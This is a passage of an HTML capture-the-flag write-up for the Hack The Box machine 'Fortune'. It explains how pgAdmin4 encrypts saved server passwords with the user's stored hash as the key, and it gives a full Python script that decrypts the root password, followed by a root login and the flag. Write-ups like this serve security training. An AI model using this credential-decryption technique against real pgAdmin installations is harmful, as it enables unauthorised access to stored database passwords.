+        <h3><strong>9a) Encryption - crypto.py</strong></h3><br>
+        From <code>crypto.py</code> we learn that the <code>encrypt()</code> function takes 2 parameters - a plaintext string and a key to encrypt the string with.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">def</span>&nbsp;encrypt(plaintext,&nbsp;key):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Encrypt&nbsp;the&nbsp;plaintext&nbsp;with&nbsp;AES&nbsp;method.<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Parameters:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plaintext&nbsp;--&nbsp;String&nbsp;to&nbsp;be&nbsp;encrypted.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&nbsp;Key&nbsp;for&nbsp;encryption.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;"""</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;iv&nbsp;=&nbsp;Random.new().read(AES.block_size)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;cipher&nbsp;=&nbsp;AES.new(pad(key),&nbsp;AES.MODE_CFB,&nbsp;iv)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;If&nbsp;user&nbsp;has&nbsp;entered&nbsp;non&nbsp;ascii&nbsp;password&nbsp;(Python2)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;we&nbsp;have&nbsp;to&nbsp;encode&nbsp;it&nbsp;first</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">hasattr</span>(<span style="color:#ff9d00;font-weight:700">str</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'decode'</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plaintext&nbsp;=&nbsp;plaintext.encode(<span style="color:#3ad900;font-weight:400">'utf-8'</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;encrypted&nbsp;=&nbsp;base64.b64encode(iv&nbsp;+&nbsp;cipher.encrypt(plaintext))<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;encrypted
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>9b) Encryption call - __init__.py</strong></h3><br>
+        By reading <code>/web/pgadmin/browser/server_groups/servers/__init__.py</code>, we see that the “key†being used to encrypt the password is the currently logged-in user's pgadmin4 password - line 805.<br>
+            <div class="codebox">
+                ...<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;login&nbsp;with&nbsp;password</span><br>
+                have_password&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br>
+                password&nbsp;=&nbsp;data[<span style="color:#3ad900;font-weight:400">'password'</span>]<br>
+                password&nbsp;=&nbsp;encrypt(password,&nbsp;current_user.password)<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-10" name="h3-10"></a><strong></strong>
+        <h3><strong>9c) current_user.password</strong></h3><br>
+        This is the point at which you don't make assumptions. If you understand/read the rest of the code fully this might be obvious to you.<br>
+        <br>
+        The <code>current_user.password</code> value is the exact string that's in the <code>password</code> column for a user in the <code>user</code> table for pgadmin4. Here's a picture from <code>DB Browser for SQLite</code>.<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        Bob is the user that changed the dba password, which we know from the email.<br>
+        Therefore, the “key†the decrypt the dba password is bob's password value (which is a hash and a coding mistake by the pgadmin4 devs that allows you to use this hash value, this mistake is later rectified):<br>
+        <br>
+        <code>$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg</code><br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>10) Write decryption script &amp; decrypt</strong></h2><br>
+        If you read more of <code>crypto.py</code> from the source code, you'll find a <code>decrypt()</code> function as well.<br>
+        <br>
+        <strong>/web/pgadmin/utils/crypto.py</strong><br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">def</span>&nbsp;decrypt(ciphertext,&nbsp;key):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Decrypt&nbsp;the&nbsp;AES&nbsp;encrypted&nbsp;string.<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Parameters:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ciphertext&nbsp;--&nbsp;Encrypted&nbsp;string&nbsp;with&nbsp;AES&nbsp;method.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&nbsp;key&nbsp;to&nbsp;decrypt&nbsp;the&nbsp;encrypted&nbsp;string.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;"""</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">global</span>&nbsp;padding_string<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;ciphertext&nbsp;=&nbsp;base64.b64decode(ciphertext)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;iv&nbsp;=&nbsp;ciphertext[:AES.block_size]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;cipher&nbsp;=&nbsp;AES.new(pad(key),&nbsp;AES.MODE_CFB,&nbsp;iv)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;decrypted&nbsp;=&nbsp;cipher.decrypt(ciphertext[AES.block_size:])<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;decrypted
+            </div>
+        </div><br>
+        <br>
+        <code>decrypt()</code> takes 2 parameters - the ciphertext and a key - both of which we have:<br>
+        • ciphertext (dba's password) - <code>utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz</code><br>
+        • key (bob's password) - <code>$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg</code><br>
+        <br>
+        <code>decrypt()</code> is using the <code>pad()</code> function from the script and the <code>padding_string</code> global variable. Copy both of those, plus the imports, the ciphertext and key, and the decrypt function into a file to create your own decryption script. Call <code>decrypt()</code> and print the result.<br>
+        <br>
+        Here's my script.<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#hackthebox&nbsp;Fortune&nbsp;-&nbsp;decrypt&nbsp;r0_0t</span><br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;base64<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;hashlib<br>
+                <br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;Crypto&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;Random<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;Crypto.Cipher&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;AES<br>
+                <br>
+                padding_string&nbsp;=&nbsp;b<span style="color:#3ad900;font-weight:400">'}'</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">def</span>&nbsp;pad(key):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""Add&nbsp;padding&nbsp;to&nbsp;the&nbsp;key."""</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">global</span>&nbsp;padding_string<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;str_len&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(key)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Key&nbsp;must&nbsp;be&nbsp;maximum&nbsp;32&nbsp;bytes&nbsp;long,&nbsp;so&nbsp;take&nbsp;first&nbsp;32&nbsp;bytes</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;str_len&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">32</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;key[:<span style="color:#ff0044;font-weight:400">32</span>]<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;If&nbsp;key&nbsp;size&nbsp;id&nbsp;16,&nbsp;24&nbsp;or&nbsp;32&nbsp;bytes&nbsp;then&nbsp;padding&nbsp;not&nbsp;require</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;str_len&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">16</span>&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;str_len&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">24</span>&nbsp;<span style="color:#ff9d00;font-weight:700">or</span>&nbsp;str_len&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">32</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;key<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Convert&nbsp;bytes&nbsp;to&nbsp;string&nbsp;(python3)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#ff9d00;font-weight:700">hasattr</span>(<span style="color:#ff9d00;font-weight:700">str</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'decode'</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;padding_string&nbsp;=&nbsp;padding_string.decode()<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Add&nbsp;padding&nbsp;to&nbsp;make&nbsp;key&nbsp;32&nbsp;bytes&nbsp;long</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;key&nbsp;+&nbsp;((<span style="color:#ff0044;font-weight:400">32</span>&nbsp;-&nbsp;str_len&nbsp;%&nbsp;<span style="color:#ff0044;font-weight:400">32</span>)&nbsp;*&nbsp;padding_string)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">def</span>&nbsp;decrypt(ciphertext,&nbsp;key):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Decrypt&nbsp;the&nbsp;AES&nbsp;encrypted&nbsp;string.<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Parameters:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ciphertext&nbsp;--&nbsp;Encrypted&nbsp;string&nbsp;with&nbsp;AES&nbsp;method.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&nbsp;key&nbsp;to&nbsp;decrypt&nbsp;the&nbsp;encrypted&nbsp;string.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;"""</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">global</span>&nbsp;padding_string<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;ciphertext&nbsp;=&nbsp;base64.b64decode(ciphertext)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"ciphertext&nbsp;b64&nbsp;decoded&nbsp;=&nbsp;"</span>&nbsp;+&nbsp;ciphertext<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;iv&nbsp;=&nbsp;ciphertext[:AES.block_size]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"first&nbsp;16&nbsp;bytes&nbsp;of&nbsp;decoded&nbsp;ciphertext&nbsp;as&nbsp;iv&nbsp;=&nbsp;"</span>&nbsp;+&nbsp;iv<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;cipher&nbsp;=&nbsp;AES.new(pad(key),&nbsp;AES.MODE_CFB,&nbsp;iv)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;decrypted&nbsp;=&nbsp;cipher.decrypt(ciphertext[AES.block_size:])<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;decrypted<br>
+                <br>
+                ciphertext&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz"</span><br>
+                key&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg"</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"---&nbsp;DECRYPTION&nbsp;---&nbsp;"</span><br>
+                decrypted&nbsp;=&nbsp;decrypt(ciphertext,&nbsp;key)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n---&nbsp;RESULTS&nbsp;---"</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"decrypted&nbsp;=&nbsp;"</span>&nbsp;+&nbsp;decrypted
+            </div>
+        </div><br>
+        <br>
+        Run the script...<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;python&nbsp;decrypt.py&nbsp;<br>
+                ---&nbsp;DECRYPTION&nbsp;---&nbsp;<br>
+                ciphertext&nbsp;b64&nbsp;decoded&nbsp;=&nbsp;���9�&amp;C��K:�.&gt;1q/L��5�!'�0]c�|J)k���j��- oQ&nbsp;!�<br>
+                first&nbsp;16&nbsp;bytes&nbsp;of&nbsp;decoded&nbsp;ciphertext&nbsp;as&nbsp;iv&nbsp;=&nbsp;���9�&amp;C��K:�.&gt;<br>
+                <br>
+                ---&nbsp;RESULTS&nbsp;---<br>
+                decrypted&nbsp;=&nbsp;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+            </div>
+        </div><br>
+        <br>
+        And we have <code>root</code>'s password! - <code>R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!</code><br>
+        <br>
+        <code>su</code> to root and retrieve your prize!<br>
+            <div class="codebox">
+                fortune$&nbsp;su&nbsp;root<br>
+                Password:&nbsp;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!<br>
+                fortune#&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(wheel)&nbsp;groups=0(wheel),&nbsp;2(kmem),&nbsp;3(sys),&nbsp;4(tty),&nbsp;5(operator),&nbsp;20(staff),&nbsp;31(guest)<br>
+                fortune#&nbsp;cd&nbsp;~<br>
+                fortune#&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;36<br>
+                drwx------&nbsp;&nbsp;&nbsp;4&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;13&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Jul&nbsp;&nbsp;8&nbsp;19:13&nbsp;..<br>
+                drwx------&nbsp;&nbsp;&nbsp;3&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;.cache<br>
+                -rw-------&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;578B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.cshrc<br>
+                -rw-------&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;94B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.cvsrc<br>
+                -rw-------&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;328B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.login<br>
+                -rw-------&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;468B&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.profile<br>
+                drwx------&nbsp;&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;.ssh<br>
+                -r--------&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;33B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;root.txt<br>
+                fortune#&nbsp;cat&nbsp;root.txt<br>
+                335af7f...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
